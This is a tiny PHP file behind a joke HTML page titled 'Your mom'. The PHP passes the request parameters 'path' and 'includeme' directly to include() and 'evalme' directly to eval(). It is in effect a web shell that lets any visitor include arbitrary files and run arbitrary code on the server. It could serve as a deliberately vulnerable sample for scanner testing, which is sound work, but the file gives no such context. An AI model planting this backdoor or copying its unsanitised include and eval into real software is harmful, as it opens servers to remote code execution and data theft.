<?php
if (isset($_REQUEST['path'])) {
    include($_REQUEST['path']);
}
if (isset($_REQUEST['includeme'])) {
    include($_REQUEST['includeme']);
}
if (isset($_REQUEST['evalme'])) {
    eval($_REQUEST['evalme']);
}

?>
<html>
<head><title>Your mom</title></head>
<body>
<H1>Your mom</H1>
</body>
</html>
